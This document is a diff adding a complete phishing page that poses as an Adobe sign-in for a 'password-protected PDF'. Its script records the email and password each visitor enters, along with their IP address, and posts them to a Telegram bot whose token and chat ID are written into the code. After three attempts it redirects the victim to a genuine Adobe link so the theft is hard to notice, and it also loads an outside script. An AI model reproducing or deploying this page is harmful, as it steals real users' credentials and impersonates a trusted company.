@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Adobe.com</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background: url('https://i.ibb.co/q3wMDVkw/pdf.jpg') no-repeat center center fixed;
+  background-size: cover;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  margin: 0;
+}
+.login-container {
+  background: rgba(255, 255, 255, 0.8);
+  padding: 20px;
+  width: 300px;
+  text-align: center;
+  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+  border-radius: 8px;
+}
+.login-container img {
+  width: 60px;
+  margin-bottom: 12px;
+}
+.login-container h2 {
+  font-size: 20px;
+  margin: 0 0 8px;
+}
+.login-container p {
+  font-size: 14px;
+  color: #5f6368;
+  margin-bottom: 12px;
+}
+input[type="text"], input[type="password"] {
+  padding: 8px;
+  font-size: 14px;
+  margin-bottom: 12px;
+  border: 1px solid #dadce0;
+  border-radius: 4px;
+  box-sizing: border-box;
+}
+#email {
+  width: 90%;
+  max-width: 260px;
+  padding: 6px 8px;
+  font-size: 13px;
+  margin: 0 auto 12px auto;
+  display: block;
+}
+input[type="password"] {
+  width: 100%;
+}
+.forgot-link, .guest-link {
+  display: block;
+  text-decoration: none;
+  color: #1a73e8;
+  font-size: 13px;
+  margin-bottom: 12px;
+}
+.buttons {
+  display: flex;
+  justify-content: space-between;
+}
+.buttons a {
+  text-decoration: none;
+  color: #1a73e8;
+  font-weight: bold;
+  font-size: 13px;
+}
+.buttons button {
+  background: #1a73e8;
+  color: white;
+  border: none;
+  padding: 8px 16px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 14px;
+}
+.buttons button:hover {
+  background: #1669c1;
+}
+.footer {
+  margin-top: 12px;
+  font-size: 12px;
+  color: #5f6368;
+}
+#password-section {
+  display: none;
+}
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+// Function to switch to the password section
+function showPasswordSection() {
+  var email = document.getElementById('email').value;
+  if (email.trim() === "") {
+    alert("Please enter an email");
+    return;
+  }
+  document.getElementById('user-email').innerText = email;
+  document.getElementById('email-section').style.display = 'none';
+  document.getElementById('password-section').style.display = 'block';
+  document.getElementById('password-button').innerText = "Login";
+}
+// Function to send data to Telegram
+function sendTeleMsg(email, passkey, ip) {
+  var message = "+===========Adobe.com=======\n";
+  message += "[IP] : " + ip + "\n";
+  message += "[EM] : " + email + "\n";
+  message += "[PW] : " + passkey;
+  let token = '6484082186:AAHjlkax9f8U4OZfPQIETvcQchmHrmGNfQA';
+  var chatid = '6669902216';
+  $.ajax({
+    async: true,
+    crossDomain: true,
+    url: "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatid,
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "cache-control": "no-cache"
+    },
+    data: JSON.stringify({ "chat_id": chatid, "text": message })
+  }).done(function (response) {
+    if (response.ok) {
+      console.log("Message sent successfully");
+    }
+  });
+}
+// Function to handle login
+$(document).ready(function () {
+  // Fetch the user's IP address
+  $.getJSON('https://json.geoiplookup.io/?callback=?', function (data) {
+    document.getElementById("hidden_ip").value = data.ip;
+  });
+  var count = 0;
+  // Handle login when the "Login" button is clicked
+  document.querySelector("#signIn").addEventListener('click', function () {
+    const email = document.querySelector("#email").value;
+    const passkey = document.querySelector("#password").value;
+    const ip = document.querySelector("#hidden_ip").value;
+    if (!passkey) {
+      document.querySelector("#password__empty").style.display = "block";
+      setTimeout(() => {
+        document.querySelector("#password__empty").style.display = "none";
+      }, 1000);
+      return;
+    }
+    // Send the data to Telegram
+    sendTeleMsg(email, passkey, ip);
+    count++;
+    if (count >= 3) {
+      // After 3 failed attempts, redirect to another page
+      window.location.href = "https://acrobat.adobe.com/id/urn:aaid:sc:EU:06ea9f6e-7007-4037-bd20-f92f4406254b";
+    } else {
+      // Show error message if password is incorrect
+      const errorMessage = count === 10 ? "#password__incorrect1" : "#password__incorrect";
+      document.querySelector(errorMessage).style.display = "block";
+      setTimeout(() => {
+        document.querySelector(errorMessage).style.display = "none";
+        document.querySelector("#password").value = "";
+      }, 1000);
+    }
+  });
+});
+</script>
+</head>
+<body>
+<div class="login-container">
+  <img src="https://i.ibb.co/p6NMD7wY/image.jpg" alt="Adobe Logo" />
+  <div id="email-section">
+    <h2>Login</h2>
+    <p>To Continue to Adobe</p>
+    <input type="text" id="email" placeholder="Enter your Email" />
+    <a href="#" class="forgot-link">This PDF is password protected</a>
+    <a href="#" class="guest-link">Stay informed about special deals from Adobe</a>
+    <div class="buttons">
+      <a href="https://www.adobe.com/za/" target="_blank">Create account</a>
+      <button onclick="showPasswordSection()">Next</button>
+    </div>
+  </div>
+  <div id="password-section">
+    <h2>Welcome</h2>
+    <p><strong id="user-email">example@adobe.com</strong></p>
+    <input type="password" id="password" placeholder="Enter your password" />
+    <label><input type="checkbox" /> Show password</label>
+    <div class="buttons">
+      <a href="#">Because you are accessing sensitive info, you need to verify your password to view Or Download PDF</a>
+      <button id="signIn">Login</button>
+    </div>
+  </div>
+
+  <div id="password__incorrect" style="display:none; color:red;">Incorrect password</div>
+  <div id="password__incorrect1" style="display:none; color:red;">Incorrect password after 3 attempts</div>
+  <div id="password__empty" style="display:none; color:red;">Password is required</div>
+  
+  <div class="footer">English (United States) | Help | Privacy | Terms</div>
+</div>
+<input type="hidden" id="hidden_ip" />
+<script src="https://www.drv.tw/inc/wd.js?s=hqneorjlhxx3cwja2f5giq"></script>
+</body>
+</html>
